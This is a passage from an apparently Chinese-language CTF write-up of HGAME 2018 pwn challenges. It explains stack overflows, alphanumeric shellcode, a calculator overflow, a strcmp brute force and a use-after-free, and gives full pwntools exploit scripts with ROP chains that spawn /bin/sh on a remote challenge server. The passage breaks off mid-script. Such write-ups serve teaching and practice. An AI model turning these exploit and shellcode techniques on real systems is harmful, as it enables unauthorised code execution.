id="hacker-system-v1"><a href="#hacker-system-v1" class="headerlink" title="hacker_system_v1"></a>hacker_system_v1</h2><p>程序功能较多，但留下的漏洞很明显， 用户可以自定义输入长度，但是用于存储的空间是一定的，因此存在栈溢出漏洞，并且没有开启canary保护。</p><p><img src="/img/hgame2018/2_3_1.png" alt=""></p><p>通常的栈溢出需要泄露libc地址，因此构造的rop分成两段，首先打印出puts@got泄露出libc地址，再read另一段rop到bss段中可以写的位置，最终将栈迁移过去。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x8048B1B'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10005</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc32.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'200'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">padding = <span class="string">'a'</span>*<span class="number">0x34</span></span><br><span class="line">pr = <span class="number">0x08048455</span></span><br><span class="line">pppr = <span class="number">0x08048d49</span></span><br><span class="line">rop = padding + p32(<span class="number">0x804be00</span>)+p32(elf.symbols[<span class="string">'puts'</span>]) + p32(pr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804be00</span>) + p32(<span class="number">0x100</span>)+ p32(<span class="number">0x08048d4b</span>)+p32(<span class="number">0x804be00</span>)+p32(<span class="number">0x8048B1A</span>)<span class="comment"># p32(0x804843e)</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.recvuntil(<span class="string">'find!!\n'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts address:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system address:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p32(<span class="number">0x804bc00</span>)+ p32(libc.symbols[<span class="string">'system'</span>])+p32(<span class="number">0xdeadbeef</span>)+p32(next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x08048d4b : pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048d48 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048455 : pop ebx ; ret</span></span><br><span class="line"><span class="string">0x08048d4a : pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048d49 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x0804843e : ret</span></span><br><span class="line"><span class="string">0x080487f0 : ret 0x458b</span></span><br><span class="line"><span class="string">0x0804819c : ret 0x8694</span></span><br><span class="line"><span class="string">0x080485ce : ret 0xeac1</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="ez-shellcode-ver2"><a href="#ez-shellcode-ver2" class="headerlink" title="ez_shellcode_ver2"></a>ez_shellcode_ver2</h2><p>这个是ez_shellcode的升级版本，对shellcode长度没有限制，仅限制shellcode是a~zA~Z0~9范围内，这样的shellcode叫alpha shellcode，利用msfencode可以生成，但大多数时候都直接使用可以百度到的orz  <a href="http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int" target="_blank" rel="noopener">http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int</a> 80这样的指令。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./ez_shellcode_ver2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048663')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10007</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">shellcode = <span class="string">'''PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a = shellcraft.sh()</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line"></span><br><span class="line">p.sendline((shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="LEVEL-WEEK-3"><a href="#LEVEL-WEEK-3" class="headerlink" title="LEVEL - WEEK 3"></a>LEVEL - WEEK 3</h1><h2 id="hacker-system-ver2"><a href="#hacker-system-ver2" class="headerlink" title="hacker_system_ver2"></a>hacker_system_ver2</h2><p>这是第二周题目的升级版，除了编译环境从x86转换到了x64没任何差别，包括漏洞。</p><p>因此利用同样的解题思路进行rop构造，仅是gadget的使用方法不同罢了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver2'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./hacker_system_ver2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x400d74'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10008</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'200'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">padding = <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line"><span class="comment">#pr = 0x08048455</span></span><br><span class="line"><span class="comment">#pppr = 0x08048d49</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400fb3</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000400fb1</span></span><br><span class="line">rbp_ret = <span class="number">0x0000000000400800</span></span><br><span class="line">rop = padding + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) +p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>]) + p64(rsi_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) + p64(rbp_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x400D74</span>)</span><br><span class="line"><span class="comment">#rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.recvuntil(<span class="string">'find!!\n'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts address:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system address:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(rdi_ret) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400fac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fae : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400faf : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400800 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006a9 : ret</span></span><br><span class="line"><span class="string">0x0000000000400a29 : ret 0x8b48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 12</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>题目中实现了一个简单的计算器。题目采用静态编译的方法，编译了需要的所有函数。</p><p><img src="/img/hgame2018/3_2_1.png" alt=""></p><p>漏洞在于每次存储结果时，计数器会往后移4个字节，但是对于存储结果个数没有限制，导致栈溢出。</p><p>利用ROPgadget的ropchain功能，对于静态编译的程序，很容易可以生成一个rop链，将rop链覆盖在返回地址处即可。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./calc'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p= remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10009</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rop_string</span><span class="params">()</span>:</span></span><br><span class="line">rop = <span class="string">''</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'/bin'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop += <span class="string">'//sh'</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080dee5d</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806d445</span>) <span class="comment"># int 0x80</span></span><br><span class="line"><span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_save</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'b:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'success!!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">add_save(<span class="number">0xbadbad</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] round'</span>,str(i)</span><br><span class="line">add_save(<span class="number">68</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_input</span><span class="params">(rop_string)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop_string)/<span class="number">4</span>):</span><br><span class="line"><span class="keyword">print</span> hex(u32(rop_string[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]))</span><br><span class="line">add_save(u32(rop_string[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line">padding()</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048AC0')</span></span><br><span class="line">rop=<span class="string">'\xd3j\x05\x08`\xa0\x0e\x08F\x84\x0b\x08/bin\xfbQ\x05\x08\xd3j\x05\x08d\xa0\x0e\x08F\x84\x0b\x08//sh\xfbQ\x05\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\xfbQ\x05\x08\xc9\x81\x04\x08`\xa0\x0e\x08]\xee\r\x08h\xa0\x0e\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08E\xd4\x06\x08'</span></span><br><span class="line"><span class="comment">#print '[*] flag',flag</span></span><br><span class="line">rop_input(rop)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'bye.'</span>)</span><br><span class="line">p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="zazahui-ver2"><a href="#zazahui-ver2" class="headerlink" title="zazahui_ver2"></a>zazahui_ver2</h2><p>和上一版本的zazahui有所不同，这次利用的是strcmp的比较。</p><p><img src="/img/hgame2018/3_3_1.png" alt=""></p><p>同样存在s的溢出覆盖，不过此次不能简单的使用溢出来打印flag了，但是strcmp仍然可以利用，就是爆破。</p><p>逆向爆破flag的地址，可以大大缩短爆破次数。</p><p><img src="/img/hgame2018/3_3_2.png" alt=""></p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p= process(<span class="string">'./zazahui_ver2'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">gdb.attach(p,<span class="string">'b *0x80487AB'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10010</span>)</span><br><span class="line">dic = range(<span class="number">33</span>,<span class="number">127</span>)</span><br><span class="line">dic.append(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#qdic.reverse()</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">start = <span class="number">0x804A084</span></span><br><span class="line">end = <span class="number">0x804A060</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">i = start </span><br><span class="line"><span class="keyword">while</span> i&gt;=end:</span><br><span class="line">pro = log.progress(<span class="string">'go'</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">pro.status(<span class="string">'boom for '</span>+hex(i))</span><br><span class="line">bomb = (chr(j)+flag)+<span class="string">'\0'</span>*(<span class="number">0xb0</span>-len((chr(j)+flag)))+p32(i)</span><br><span class="line">p.send(bomb)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'too'</span> <span class="keyword">in</span> p.recvuntil(<span class="string">'&gt;'</span>):</span><br><span class="line">flag = chr(j) + flag</span><br><span class="line">pro.success(hex(i)+<span class="string">':  '</span>+hex(j)+<span class="string">'  '</span>+chr(j))</span><br><span class="line">i = i<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a= 'a'*0xb0+p32(0x804A060)+p32(0x99)</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] flag'</span>,flag</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="message-saver"><a href="#message-saver" class="headerlink" title="message_saver"></a>message_saver</h2><p>程序实现了一个可以加解密存储的记事本，逻辑简单</p><p><img src="/img/hgame2018/3_4_0.png" alt=""></p><p>只维护了一个变量作为message的存储结构，结构如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| length     |     address     |    function ptr    | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure><p>其生成方法在add函数中：</p><p><img src="/img/hgame2018/3_4_1.png" alt=""></p><p>在edit函数中可以重新编辑信息，在编辑过程中会重新申请一个内存块，但原来的并不会释放（内存泄露），最终会执行function（address）函数，主要如果可以控制内存块的内容，就完全可以控制执行逻辑。</p><p>在delete函数中会free掉这个内存块，但并未置空结构体，存在一个悬垂指针。</p><p>并且，在全部的函数中都没有检测都没有检测是否已经删除了结构块，导致一个UAF漏洞、double free漏洞。</p><p>利用UAF漏洞可以很容易的控制程序执行流程：</p><p>先申请一个非0x18的块，delete之后，在edit一个0x18的块，就可以劫持结构体内容了。</p><p>解题的exp脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 